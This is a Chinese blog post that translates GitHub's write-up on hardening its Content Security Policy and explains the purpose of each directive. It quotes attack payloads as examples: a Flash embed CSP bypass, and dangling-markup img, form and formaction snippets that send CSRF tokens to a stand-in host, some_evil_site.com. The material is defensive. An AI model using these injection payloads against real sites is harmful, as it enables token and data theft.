# GitHub CSP应用的经验分享

0x 00 Abstract
==============

* * *

最近看了一篇文章[GitHub's CSP journey](http://githubengineering.com/githubs-csp-journey/)，作者是GitHub工程师[Patrick Toomey](https://github.com/ptoomey3)，文中分享了GitHub在 应用CSP (Content Security Policy) 上一些经历和踩过的坑，并给出了一些实际的案例来说明策略设置的原因，很具有参考意义。

这里花了点时间翻译下文章的要点，并且加上一部分自己的简单理解，给大家提供参考。因为时间和水平有限，有理解或翻译错误，欢迎大家指出～

0x 01 Content Injection
=======================

* * *

文中首先介绍了`Content Injection`的概念，主要包括两个方面：

*   Cross Site Scripting (XSS): 这大家应该都懂
*   Scriptless attacks：无脚本攻击，即攻击者不通过执行Javascript代码，而通过插入HTML标签 (HTML markup injection) 的方式来完成攻击，如窃取敏感信息等。具体可以参考[Postcards from the post-XSS world](http://lcamtuf.coredump.cx/postxss/)和[Scriptless Attacks – Stealing the Pie Without Touching the Sill](https://www.nds.rub.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf)这两篇文章

因此仅防止XSS无法解决所有`Content Injection`问题。

在防止`Content Injection`上，GitHub使用了自动转义模板（auto-escaping templates）、code review和静态分析（ static analysis）的方法 。但之前的漏洞证明，内容注入问题是无法彻底避免的。虽然我们无法通过单一方法来解决，我们可以结合多种防护措施来增加攻击者利用漏洞的难度，比如[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)(CSP)，它是单独使用中最有效的缓解措施。

0x 02 Content Security Policy
=============================

* * *

Content Security Policy能够用来限制页面的 web 资源的加载和执行，如JavaScript、CSS、form表单提交等。GitHub三年前的CSP 策略如下：

```
CONTENT-SECURITY-POLICY:
  default-src *;
  script-src 'self' assets-cdn.github.com jobs.github.com ssl.google-analytics.com secure.gaug.es;
  style-src 'self' assets-cdn.github.com 'unsafe-inline';
  object-src 'self' assets-cdn.github.com;

```

初始的策略为了保证向后兼容性，主要通过限制资源加载的domain来完成，但是对于注入HTML标签来窃取敏感信息（后面会举例说明）不起作用。

后来，GitHub对第三方依赖脚本进行了重构和整理，增加了许多新的CSP策略，具体如下：

```
CONTENT-SECURITY-POLICY:
  default-src 'none';
  base-uri 'self';
  block-all-mixed-content;
  child-src render.githubusercontent.com;
  connect-src 'self' uploads.github.com status.github.com api.github.com www.google-analytics.com wss://live.github.com;
  font-src assets-cdn.github.com;
  form-action 'self' github.com gist.github.com;
  frame-ancestors 'none';
  frame-src render.githubusercontent.com;
  img-src 'self' data: assets-cdn.github.com identicons.github.com www.google-analytics.com collector.githubapp.com *.gravatar.com *.wp.com *.githubusercontent.com;
  media-src 'none';
  object-src assets-cdn.github.com;
  plugin-types application/x-shockwave-flash;
  script-src assets-cdn.github.com;
  style-src 'unsafe-inline' assets-cdn.github.com

```

注：上面的策略中，有少部分和防止`content injection`没有直接的联系。

下一章我们将会讨论上述CSP策略的具体细节、策略是如何阻止特定的攻击场景，并通过一些案例（[bounty submissions](https://bounty.github.com/)）来帮助我们理解策略的用途。

0x 03 CSP details
=================

* * *

script-src
----------

和最初的策略相比，当前的策略只允许从CDN来获取JavaScript。

前：

```
script-src 'self' assets-cdn.github.com jobs.github.com ssl.google-analytics.com secure.gaug.es;

```

后：

```
script-src assets-cdn.github.com;

```

因此只要保证CDN上的资源是可靠即可阻止外部恶意脚本的加载和执行。

此外，GitHub还采用了[subresource integrity](http://githubengineering.com/subresource-integrity/)来减少加载恶意外部 JavaScript 的风险，Subresource Integrity 通过在标签中添加`integrity`属性，其值为资源对应的hash，比如：

```
<script src="/assets/application.js" integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs="></script>

```

浏览器在加载`application.js`时，会验证其文件的 sha256 hash值是否和`integrity`的值相同，不相同则拒绝加载。这个可以防止 CDN 被撸后加载恶意 js 文件的场景，虽然 CDN 基本不太可能被撸～

这里需要特别注意的是，修改后的`script-src`值是没有包含`self`的，虽然一般来说从`self`加载JavaScript相对来说是安全的（被使用的也比较多），但还是应该尽可能避免。

比如下面这几种特殊的情况，开发者应该考虑阻止从`self`加载和允许js脚本。

*   [JSONP 接口没有过滤回调函数名](https://github.com/rails/rails/pull/9075)，导致恶意js代码执行
*   在 content 为用户可控的情况下，某些`content-type`会[被浏览器解析成为JavaScript](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1420)。Github有多个这样的接口，比如 在查看[commit diffs](https://github.com/github/fetch/commit/7eee89d15ee21e762a04b4c773fcc3d7d50a13f7.diff)时，页面内容是用户可以控制的，`content-type`为`text/plain`。

通过将`self`从策略中移除，即使是出现了上面两种情况，js代码也无法执行。

我们也可以通过增加响应头`X-Content-Type-Options: nosniff`来阻止浏览器对内容的嗅探解析（sniffed）行为。与之相比，CSP能够提供强有力的保证，即使存在一个攻击者能够控制`content-type`bug，也无需担心js代码会被执行。

object-src
----------

在旧的的CSP策略中，对于 object 和 embed 标签是允许`self`的。

```
object-src 'self' assets-cdn.github.com;

```

是因为GitHub依赖自己网站上的[ZeroClipboard](https://github.com/zeroclipboard/zeroclipboard)库。 将依赖资源移动到CDN后，`self`就不再需要了，但因为某些原因（懒得改 or 觉得不会有安全问题？），在后来的策略中并没有被移除，直到一名 bounty hunter 发现了[一种利用方式](https://bounty.github.com/researchers/adob.html#persistent-cross-site-scripting--with-csp-bypass--20140210)。攻击者利用了一个 content injection bug 和 一个Chrome浏览器的bug 来 bypass CSP，并且成功执行js代码。攻击过程如下：

首先，攻击者用以下内容创建一个 Wiki 项：

```
<div class="selected">
<a href="https://some_evil_site.com/xss/github/embed.php" class="choose_plan js-domain">domain</div>
</div>

```

GitHub拥有一个特性，能够在多个地方（Issues, Pull Requests, Comments）渲染用户提供的HTML（通常是通过Markdown）。但用户提供的HTML会经过过滤处理，防止注入任意的HTML。

这里存在一种特殊情况，当HTML 标签的class 属性被设置为`choose_plan`和`js-domain`时，会触发 JavaScript 一些自动的操作，即自动请求标签的`href`，并将 response 插入到 DOM中。

而这里用户是可以自定义HTML 标签中的class属性值的。但因为 response 中的HTML仍然会受到 CSP 的制约，无法执行任意的 JS 代码。但此时，攻击者已经可以插入任意的HTML到DOM中了。

这里我的理解是因为`some_evil_site.com`不在`'self' assets-cdn.github.com`里，所以`自动请求标签href资源`的行为会被浏览器blocked。这里需要`href`对应的domain为self 或 CDN，才能成功加载资源并且把响应插入到DOM中。

这里bounty hunter给出的 POC也符合我的推测，domain使用的是`self`，即github.com：

```
<embed src="https://github.com/test-user/test-repo/raw/master/script.png" allowscriptaccess=always type="application/x-shockwave-flash">

```

前面在**script-src**提到，用户可控的内容(user-controlled content) + 浏览器对内容的嗅探解析(content sniffing) 可能会导致非预期的行为，因此加载 GitHub.com domain上用户可控的内容会增加脚本执行的几率，所以 GitHub在加载用户可控资源时，采取了跳转到另一个域名的方式来完成，比如请求`https://github.com/test-user/test-repo/raw/master/script.png`会跳转到`https://raw.githubusercontent.com/test-user/test-repo/master/script.png`，但`raw.githubusercontent.com`不在`object-src`允许的列表里，那么上面的POC是如何让 Flash成功加载并执行的呢？

GitHub 经过研究，发现是因为[WebKit 的一个 bug](https://bugs.webkit.org/show_bug.cgi?id=97030)所导致。正常的逻辑是，浏览器会验证所有的请求（包括redirects的）是否为CSP所允许。然而，有一些浏览器只会检查第一个请求的 domain 是否在 source list中，而不检查后续的 redirects 。

因为第一个请求的 domain 是self，embed 就能通过验证。浏览器的 Bug 加上 注入的 HTML（需要注意的是 allowscriptaccess=always 属性）导致了CSP bypass。

allowscriptaccess属性的解释如下：

```
The AllowScriptAccess parameter in the HTML code that loads a SWF file controls the ability to perform outbound URL access from within the SWF file
When AllowScriptAccess is "always," the SWF file can communicate with the HTML page in which it is embedded. This rule applies even when the SWF file is from a different domain than the HTML page.

```

这里还需要注意的一点是，当 script.png 资源被加载时，返回的`content-type`是`image/png`。但不幸的是， 只要Flash觉得响应像是一个Flash文件，就会尽可能的去尝试执行！

img-src
-------

与其它策略不同，`img-src`通常被关注的比较少。通过限制image的source，能够防止敏感信息泄露。比如当攻击者能够注入如下的img标签：

```
<img src='http://some_evil_site.com/log_csrf?html=

```

可以看到标签是未闭合的，这会导致在遇到下一个匹配的单引号之前的所有内容都会被当作是参数html的值，如果中间的内容包括一些敏感信息，如CSRF token：

```
<form action="https://github.com/account/public_keys/19023812091023">
...
<input type="hidden" name="csrf_token" value="some_csrf_token_value">
</form>

```

当img被加载时，则会导致这些内容被当作参数发送到`http://some_evilsite.com/`。

这样的标签被称为`dangling markup`，除了 img 标签之外，还有一些标签页能够窃取敏感信息。通过限制CSP 的 img-src，就能够缓解这样的情况。

connect-src
-----------

前面提到过，在标签的class为某些特殊值时，JavaScript会自动加载标签对应的URl资源，并修改DOM。通过限制`connect-src`（限制XMLHttpRequest, WebSocket, and EventSource 的连接） 到特定的 domain list，能够减少可能的攻击面（ attack surface）。比如向`api.braintreegateway.com`的连接只在支付相关的页面被允许。

当然，如果为每一个页面都手动添加`connect-src`，维护起来非常困难，GitHub使用了[Secure Headers library](https://github.com/twitter/secureheaders)来实现动态 CSP 策略调整，感兴趣的可以看看。

form-action
-----------

通过限制form表单可以提交的 action，可以降低`form`标签注入所带来的风险。与之前讨论的 "dangling markup" 标签 image 不同的是，form更加的微妙。比如攻击者能够注入如下的代码：

```
<form action="https://some_evil_site.com/log_csrf_tokens">

```

注入标签后的内容是一个form表单，如下：

```
<form action="https://github.com/account/public_keys/19023812091023">
...
<input type="hidden" name="csrf_token" value="afaffwerouafafaffasdsd">
</form>

```

因为注入的form标签没有闭合，浏览会向下寻找`</form>`，然后把之间的所有内容都作为表单的field，当用户点击提交时，一些敏感数据，比如csrf token就会发送到`https://some_evil_site.com/log_csrf_tokens`，导致信息泄露。

类似的通过`button`也可以完成：

```
<button type="submit" form="version-form" formaction="https://some_evil_site.com/log_csrf_tokens">Click Me</button>

```

通过限制`form-action`到特定的 domain list，可以减低所有通过 form 表单提交的方法来窃取敏感信息的可能性。

但是GitHub测试后发现，当用户在使用 Github OAuth 来登录第三方应用时，因为限制了`form-action`，会导致登陆失败。

来看一下OAuth登录的过程，用户访问类似如下链接`https://github.com/login/oauth/authorize?client_id=b6a3dd26bac171548204`，如果用户之前已经授权过该应用，就会跳转到应用程序的网站，如果没有则会弹框让用户先允许授权。授权的过程会向 GitHub.com 提交一个`POST`请求，然后302跳转到应用的网站。在这个过程中，form表单时提交到 GitHub.com的，但是响应是跳转到第三方网站，因为第三方网站的domain不在`form-action`的列表里，跳转会blocked。

那么是否要移除`form-action`的限制呢？GitHub想到使用 "meta refresh" 跳转，类似这样：

```
<head>      
    <title>The Tudors</title>      
    <meta http-equiv="refresh" content="0;URL='http://thetudors.example.com/'" />    
</head>  

```

[meta refresh](https://www.w3.org/TR/WCAG20-TECHS/H76.html)是用来在客户端进行跳转的一种技术（用js跳转也可以）。通过避免302跳转，CSP只会检查表单提交的请求进行，而不会检查之后的跳转，从而解决了这个问题。

GitHub在文中还提到，他们最终会为`form-action`添加 dynamic source 支持。

child-src/frame-src
-------------------

Inline frames (iframes) 是很强的安全边界。每个 frame 都受到同源策略的限制，就如同在单独的window 或 tab 打开一样。但是有一些情况下，比如攻击者能够在 GitHub.com 上注入一个frame，frame能够加载任意网站的内容，如果这个网址需要返回一个401的响应码（HTTP Authentication），而此时浏览器不会处理内嵌的contexts，就会弹框要求用户输入帐号密码。对于大多数有安全意识的人都知道GitHub.com不会使用 basic authentication 或 JavaScript`prompt`dialogs，但总有些人不知道，就傻乎乎的输入帐号密码了。

Firefox 浏览器支持一些frame的sandbox指令来防止这样的情况，如`allow-modals`，但是只对某些特定的 sandboxed frames 有效。在CSP中也没有相似的指令来限制某个frame是否能够弹框。目前唯一的缓解措施就是限制能够被framed的 domain。

目前GitHub的策略是只允许自己的渲染域（render domain），比如用来渲染[STL files](https://help.github.com/articles/3d-file-viewer/),[image diffs](https://help.github.com/articles/rendering-and-diffing-images/), 和[PDFs](https://help.github.com/articles/rendering-pdf-documents/)。不久前，GitHub在使用[automatic generator](https://help.github.com/articles/creating-pages-with-the-automatic-generator/)来生成预览页面的地方加入了`self`。这里GitHub也提到，在将来，会使用之前提到的动态策略（dynamic policy）来取代。

frame-ancestors
---------------

这个指令是用来取代`X-FRAME-OPTIONS`header的，可以缓解点击劫持（clickjacking ）和其它。目前该指令没有得到浏览器广泛的支持，GitHub 在所有的响应中同时设置了`frame-ancestors`指令和`X-FRAME-OPTIONS`header。目前默认的策略是阻止所有 framing GitHub内容的行为 。和`frame-src`类似，这里是用了动态策略，在[预览生成的GitHub页面](https://help.github.com/articles/creating-pages-with-the-automatic-generator/)的地方添加了`self`。同时我们也允许通过 iframes 来 framing 分享[Gists](https://gist.github.com/)的页面。

base-uri
--------

比较少见，如果攻击者能够注入`base`标签到页面的head中，就可以改变所有relative URLs 。通过将其限制为`self`， 我们可以保证攻击者不能够修改所有的relative URLs 和 将带有CSRF tokens的form提交到恶意的站点。

plugin-types
------------

许多浏览器插件都或多或少都存在一些安全问题，将插件限制到GitHub真正用到的列表，能够减少注入`object`或`embed`标签后的潜在影响。`plugin-types`指令与`object-src`的作用之间有一定的关联性。正如之前所提到的，一旦[clipboard API](https://www.w3.org/TR/clipboard-apis/)得到更广泛的支持，GitHub就会block`object`和`embed`标签，把`object-src`的source设置成`none`， 并将`application/x-shockwave-flash`从`plugin-types`移除。

0x 04 Summay
============

* * *

GitHub分享了自己在应用CSP的经验和案例说明，个人觉得对于很多网站再应用CSP的时候有很好的参考和学习价值。

PS. 因翻译的比较急，有些地方我也没有弄的很明白，大家有疑问可以留言一起讨论～